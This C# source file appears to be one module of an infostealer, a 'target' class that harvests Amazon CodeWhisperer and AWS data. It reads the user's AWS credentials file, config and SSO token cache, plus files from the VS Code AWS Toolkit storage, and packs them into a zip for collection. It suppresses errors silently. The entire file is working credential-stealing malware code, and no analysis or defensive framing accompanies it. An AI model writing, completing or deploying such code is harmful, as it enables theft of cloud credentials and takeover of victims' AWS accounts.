using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class AmazonCodeWhisperer : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var entry = new Counter.CounterApplications { Name = "Amazon CodeWhisperer" };
            string[] awsFiles = {
                Path.Combine(userProfile, ".aws", "credentials"),
                Path.Combine(userProfile, ".aws", "config"),
                Path.Combine(userProfile, ".aws", "sso", "cache")
            };
            foreach (string path in awsFiles)
            {
                if (File.Exists(path))
                {
                    try
                    {
                        string rel = "AI-Agent\\CodeWhisperer\\" + Path.GetFileName(path);
                        zip.AddFile(rel, File.ReadAllBytes(path));
                        entry.Files.Add(path + " => " + rel);
                    }
                    catch { }
                }
                else if (Directory.Exists(path))
                {
                    foreach (string file in Directory.GetFiles(path, "*", SearchOption.TopDirectoryOnly))
                    {
                        try
                        {
                            string rel = "AI-Agent\\CodeWhisperer\\sso\\" + Path.GetFileName(file);
                            zip.AddFile(rel, File.ReadAllBytes(file));
                            entry.Files.Add(file + " => " + rel);
                        }
                        catch { }
                    }
                }
            }
            string[] vscodeDirs = { "Code", "Code - Insiders" };
            foreach (string vscodeDir in vscodeDirs)
            {
                string dir = Path.Combine(appdata, vscodeDir, "User", "globalStorage", "amazonwebservices.aws-toolkit-vscode");
                if (!Directory.Exists(dir)) continue;
                foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                {
                    if (new FileInfo(file).Length > 1 * 1024 * 1024) continue;
                    try
                    {
                        string rel = "AI-Agent\\CodeWhisperer\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
